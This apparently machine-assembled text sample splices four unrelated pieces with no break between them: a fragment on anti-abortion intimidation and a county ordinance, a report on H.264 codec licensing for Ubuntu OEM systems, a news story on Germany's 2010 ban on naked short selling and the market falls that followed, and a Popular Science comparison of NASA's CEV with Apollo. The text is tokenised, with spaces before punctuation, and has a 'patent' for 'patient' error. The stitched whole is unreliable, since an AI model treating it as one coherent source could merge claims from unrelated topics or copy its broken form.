The threat of violating a patent ’s privacy , letting her believe she could be found out , shamed , or some other way punished for her choice is key in anti-abortion intimidation .
Fighting ordinances like the “ Patient Safety Ordinance ” is necessary because if abortion fights can be moved to and decided by such a a small locality what looks like only minor encroachment can actually shift the entire landscape when it comes to access .
What just one county does seems so unimportant in the bigger picture when it comes to fighting for reproductive justice .
Plus , if that one county is the only access in a state , suddenly the whole scene has changed .
And when 87 percent of the counties in the United States have no abortion providers , that change can be devastating for the women who need assistance .
With the current controversy over H.264 patent pools and open source codecs , some observers have noted that Canonical is listed as a licensee of H.264 from MPEGLA , the patent pool which licenses out the codec patents , causing some to ask if Ubuntu users were covered by this license .
The H talked to Canonical 's Chris Kenyon who handles OEM services at the Linux distributor who explained the answer was ' it depends ' .
If a user downloads Ubuntu and installs it themselves , then as Ubuntu is free software , no MPEG - LA licence is included .
Kenyon says
" The good news it that there are other ways of enjoying video content and we strongly believe in the work to establish open source codecs " .
He noted that the company already " offer strong support for Ogg Vorbis in our standard images " .
Where the H.264 licence comes into play , says Kenyon , is if a device has been bought with Ubuntu pre-installed .
OEM's have the option when using Canonical 's OEM services to obtain the rights to include products and licenses for a number of proprietary packages .
Kenyon says " Like Adobe Flash , Adobe Acrobat , Fluendo , RealPlayer , DVD players and other proprietary software , we have a direct re-distribution agreement for H.264 " .
However , this does n't mean that if the Ubuntu operating system is pre-installed by the OEM , that it necessarily has a H.264 licence ; the vendor may have opted not to include it .
" An OEM decides what additional software & codecs they want to ship down to how many Dolby sound channels they want to support " says Kenyon , but the issue " is further complicated by some components ( like DVD drives ) coming with codec and software licences pre-bundled . "
When purchasing an OEM machine with Ubuntu pre-installed , there is currently no way to tell , without the manufacturer explicitly specifying them , which software and codecs are bundled with the machine .
A device may be validated as Ubuntu Compatible , which means the OEM has tested the system and Canonical has verified the test , or as Ubuntu Certified , which means that Canonical have performed the testing .
Kenyon points to the Ubuntu Certified list on the Canonical site , which lists systems from Lenovo , ASUSTek , HP , Toshiba , Samsung and Dell .
Kenyon added " We have explored setting some minimum requirements for codecs , but this is not something that we presently do " .
So the rule of thumb is that an arbitrary Ubuntu system does not have a H.264 licence via Canonical , unless it 's an OEM system which specifically lists the H.264 licence in its documentation or marketing materials .

Image caption Short selling in Germany

World shares fell on Wednesday after a surprise move by Germany to ban some types of short - selling of financial products .
Bans on short selling have been introduced in recent times of financial instability by both the UK and US .
And there were fears the Berlin move to limit short - selling could indicate more bad news lurking in the eurozone .
That in turn has led to uncertainty , as investors mull the impact of any eurozone instability on wider markets .
Key share indexes in London , Paris , Frankfurt lost close to 3 % .
On Wall Street the Dow Jones fell by 0.63 % .
Earlier , the euro hit another a four - year low against the dollar .
It fell to $ 1.214 before recovering to $ 1.239 .
In London the FTSE was down by 2.8 % at 5158.08 points , and the falls were mirrored by drops in France and Germany .
At the close in Paris the Cac 40 was 2.9 % lower at 3,511.67 , and in Germany the Dax closed behind by 2.7 % , at 5,988.67 .
' Biggest test '
Some analysts believe the German government made the short - selling move after domestic pressure on Chancellor Angela Merkel , who has faced criticism over her response to the Greek debt crisis .
On Wednesday in a debate about Germany 's part in the multi-billion euro bail - out of Greece she warned politicians that strict financial regulation was needed to ensure the survival of the eurozone .
Analysis The Germans just can't seem to win .
When they 're perceived as doing nothing , as being the only Eurozone country opposing a bailout of Greece , then Europe comes across as divided , the markets splutter , the euro takes a dive .
But when the Germans are the first to act , before any of their European partners , the result is the exactly same : the picture of European disunity forcing stocks and shares and the euro down .
That 's exactly what 's happened with Berlin 's battle against speculators .
By clamping down on naked short selling - in effect , declaring war on traders who try to make a quick buck at the expense of the unhealthy euro - the Germans have taken their European colleagues completely by surprise .
France has already said it wo n't be following suit .
Neither will Finland , Sweden , or the Netherlands .
Once again , Europe looks divided , its approach to the euro crisis disjointed .
In parliament today Angela Merkel warned that if the euro fails - so will Europe .
She called for a new culture of stability - but it's the spectre of instability which continues to haunt the financial markets across Europe .
But her comments to the German parliament that the " current crisis " facing the euro was " the biggest test Europe has faced in decades " were seen as undermining rather than helping the single currency .
However , while the EU has said other national regulators should follow Germany 's lead , BBC business editor Robert Peston said that while some countries may impose similar bans but there was no sign of the larger economies doing so .
Lucrative
The German financial regulator has banned traders in the country from " naked " short - selling of euro - denominated government bonds and of shares in the country 's 10 most important financial institutions .
Short - sellers usually borrow shares , sell them , then buy them back when the stock falls and return them to the lender , keeping the difference in price .
" Naked " short selling occurs when a trader sells a financial instrument that has not yet been borrowed .
Robert Peston said the regulator saw a ban on the shorting of government bonds - or debt - as an attempt to stop " what it would see as mischievous bets by investors that the financial difficulties of the likes of Greece and Portugal will worsen " .
" It thinks that such bets are what force down the price of Greek and Portuguese government bonds , which then spook investors , and make it much more difficult and expensive for the likes of the Greek and Portuguese governments to borrow vital new money , " he added .
Investors see it as a fairly desperate attempt to ease strains in eurozone markets Robert Peston , BBC business editor Read Robert 's blog
The German ban will run from 19 May to 31 March 2011 .
It will also apply to the use of credit derivatives to bet on a fall in the value of the debt of a eurozone government , unless the investor owns some of the relevant debt .
Credit default swaps are financial derivatives that provide insurance for losses if a borrower goes bankrupt , and have become a lucrative trading market .
' Uncoordinated '
Germany 's market regulator , Bafin , said that the " extraordinary volatility of the bonds of eurozone states " had justified the short - selling ban .
The euro is starting to look like a car with 16 drivers , all running on different fuels and following individual maps with no one really sure who is at the wheel .
Richard Quest writing in the China Post Commentators on the euro crisis
However , many are questioning whether Bafin 's actions will have much impact unless other regulators do the same , given that the trading of government bonds and bank shares is a global business .
European Commission President Jose Manuel Barroso said on Wednesday that other regulators should take similar action .
" We are in agreement with Germany on the need to halt the abusive use of naked short selling , " he said .
Earlier the EU commissioner for the internal market and financial regulation , Michel Barnier , said a task force was already looking into issues including naked selling .
Greece 's Prime Minister George Papandreou has regularly claimed that traders betting on Greek government bonds had added to the woes of his debt - hit country .
And he warned that failing to control such " speculators " could cause international conflict .
" If policy does not hold sway and we simply let markets and ultimately forces behind markets take the decisions , we will go towards a world of great flux and possible crises , even conflict , " he said .
Pressure on euro
Mrs Merkel made her comments on the euro " crisis " as she defended Germany 's contribution to a near trillion - dollar package to prevent the spread of troubles suffered by debt - ridden Greece .
She said Europe needed a " stability culture " to ensure the survival of the Euro .
Currency expert Jeremy Stretch of Rabobank said that while Mrs Merkel needed to portray a bleak picture of the state European economy to MPs in Germany , the negative sentiment was being picked up by traders .
" There is scope for further downward pressure on the euro in the short to medium term , " he added .
' Circuit breakers '
Meanwhile , US regulators have proposed new trading restrictions to try to avoid a repeat of the plunge in values suffered earlier this month .
On 6 May , the market fall quickly spread out of control , and so the Securities and Exchange Commission ( SEC ) is now proposing so - called " circuit breakers " .
These would halt trading in a stock for five minutes if it fell more than 10 % in five minutes .
The new rules would apply to all stocks in the Standard & Poor 's 500 index .
CEV vs. Apollo Notable differences between new CEV and Apollo moon capsule By Dawn Stover
Popular Science
When CEV returns to Earth , it will most likely land on dry ground .
YOUR E-MAIL ALERTS National Aeronautics and Space Administration ( NASA ) Popular Science or or Create Your Own ( Popsci.com ) --
When NASA administrator Michael Griffin unveiled the agency 's plans for the Crew Exploration Vehicle ( CEV ) , he described it as " Apollo on steroids . "
The resemblance is easy to see -- each is a blunt - nosed , cone - shaped capsule that 's strapped to a rocket and sent to the moon , where it deploys a lunar lander and then returns to Earth for a parachute landing .
There are important differences , however : Size :
The four - person CEV will be 18 feet in diameter , compared with 12.8 feet for the cramped three - person Apollo capsule .
Yet CEV will be only 10 to 15 percent heavier , because it will be made from newer materials such as carbon composites and aluminum alloys .
Launch : Apollo was launched by the massive Saturn V , the biggest rocket ever built ; the CEV capsule will be launched by a smaller rocket .
That 's because the CEV will not go directly to the moon .
Instead the crew will meet up with heavier pieces of their moon - going spaceship -- launched by a separate rocket -- in Earth orbit .
Range : CEV will carry more fuel than Apollo , so astronauts will be able to go anywhere on the face of the moon .
Apollo had only enough fuel to land on the lunar equator .
Controls : CEV 's computers will be much more powerful than Apollo's , enabling all four astronauts to descend to the moon 's surface while their spaceship orbits in autopilot mode .
Landing : When CEV returns to Earth , it will most likely land on dry ground .
Apollo capsules landed in the ocean , which exposed them to corrosive saltwater and required expensive recovery efforts involving boats and aircraft .
